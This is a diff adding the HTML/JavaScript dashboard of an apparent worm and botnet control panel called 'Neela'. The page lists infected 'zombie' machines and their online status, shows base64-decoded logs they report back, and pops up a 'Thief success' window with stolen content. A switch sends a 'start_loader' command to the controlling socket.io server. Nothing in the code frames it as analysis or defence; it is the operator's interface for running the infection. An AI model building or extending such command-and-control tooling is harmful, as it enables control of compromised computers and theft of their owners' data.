@@ -1,0 +1,155 @@
+<html>
+  <head>
+    <title>Neela Platform</title>
+    <link rel="stylesheet" href="http://stopcloud.org/v2/style/semantic.min.css" />
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" />
+    <style>
+    body{
+    padding-top: 40px;
+    background-size: 932px;
+    background-position: center;
+    background-repeat: no-repeat;
+    background-position-y: 10px;
+    }
+    .container{
+      padding: 5px;
+      min-height: 300px;
+      background-color: white;
+    }
+    .logopng{
+        text-align: center;
+    }
+    </style>
+  </head>
+  <body>
+    <div class="ui container">
+      <div class="ui grid">
+        <div class="twelve wide column">
+          <p><b>N</b>EELA<small> worm platform network</small></p>
+        </div>
+        <div class="two wide column">
+          <div class="ui toggle checkbox">
+                  <input class="start_server" value="1" type="checkbox" name="public">
+                  <label></label>
+                </div></div>
+      </div>
+      <hr / />
+      <p><small>Instant progress</small></p>
+      <table class="ui compact inverted table">
+        <thead>
+          <tr>
+            <th>Zombie</th>
+            <th></th>
+          </tr>
+        </thead>
+        <tbody id="zombielist">
+        </tbody>
+        <tfoot>
+            <tr>
+              <th><span class="routinenb">0</span> Zombie</th>
+              <th></th>
+            </tr>
+        </tfoot>
+    </table>
+    <p><small> Last logs</small></p>
+    <table class="ui compact black  table">
+      <thead>
+        <tr>
+          <th>Zombie</th>
+          <th>Information</th>
+          <th>Value</th>
+        </tr>
+      </thead>
+      <tbody id="zombielog">
+      </tbody>
+    </table>
+    <table class="ui compact black  table">
+      <thead>
+        <tr>
+          <th>Routine</th>
+        </tr>
+      </thead>
+      <tbody id="routineName">
+      </tbody>
+    </table>
+    </div>
+    <div class="ui modal">
+      <div class="header">Thief success</div>
+      <div class="content">
+        <p id="logcontent"></p>
+      </div>
+    </div>
+  </body>
+  <script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="http://stopcloud.org/v2/js/semantic.min.js"></script>
+  <script>
+  var array_zombie_status = [];
+  var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/rn/g,"n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}};
+  var socket = io.connect('http://localhost:3000');
+  socket.on('listing', function(listing){
+    $('#zombielist').append('<tr id="id_'+listing.zombie+'" class="'+listing.zombie+'"><td>'+listing.zombie+'</td><td class="online_status'+listing.zombie+'"><i class="fa fa-clock-o" aria-hidden="true"></i></td></tr>');
+    var routine_nb = $('.routinenb').html();
+    routine_nb++;
+    $('.routinenb').html(routine_nb);
+    //array_zombie_status[listing.zombie] = ['name':zombie.name,'status':0];;
+  });
+  socket.on('new_log', function(log){
+    $('#zombielog').append('<tr class="'+log.zombie+'"><td>'+log.zombie+'</td><td>'+log.name+'</td><td>'+atob(log.information)+'</td></tr>');
+    //array_zombie_status[log.zombie] = ['name':zombie.name,'status':0];;
+  });
+
+  socket.emit('current_routine');
+  socket.on('return_routine', function(information){
+    console.log(information);
+    $('#routineName').append('<tr class="'+information.name[0].name+'"><td>'+information.name[0].name+'</td></tr>');
+  })
+
+  socket.on('online_notif', function(zombie){
+    if(zombie.status == 'on'){
+      //array_zombie_status[zombie.name] = ['name':zombie.name,'status':0];
+      $('.online_status'+zombie.name).html('<i class="fa fa-toggle-on green" aria-hidden="true"></i>')
+      var timeout_online = setTimeout(function(){
+        $('.online_status'+zombie.name).html('<i class="fa fa-toggle-off"></i>');
+      }, 40000);
+    }
+  });
+
+  socket.on('new_gate', function(log){
+    $('#logcontent').html(Base64.decode(log));
+    $('.ui.modal')
+      .modal('show')
+    ;
+  });
+
+  if($('.start_server').click(function(){
+    var value = $('.start_server').val();
+    if(value == '0'){
+      $('.start_server').val('1')
+    }
+    else{
+      $('.start_server').val('0');
+    }
+    socket.emit('start_loader', value);
+  }))
+
+  socket.on('delete_zombie', function(zombie){
+    var element = $('.'+zombie.name);
+    element.each(function(index, value){
+      $(element)[index].remove();
+    })
+    var routine_nb = $('.routinenb').html();
+    routine_nb--;
+    $('.routinenb').html(routine_nb);
+    if(zombie.disconnect == undefined){
+      $('#zombielog').append('<tr class="positive"><td>'+zombie.name+'</td><td>information</td><td>Success</td></tr>');
+    }
+    else if(zombie.error != undefined){
+      $('#zombielog').append('<tr class="negative"><td>'+zombie.name+'</td><td>information</td><td>Error</td></tr>');
+    }
+    else{
+      $('#zombielog').append('<tr class="negative"><td>'+zombie.name+'</td><td>information</td><td>Disconnected</td></tr>');
+    }
+  });
+  </script>
+</html>
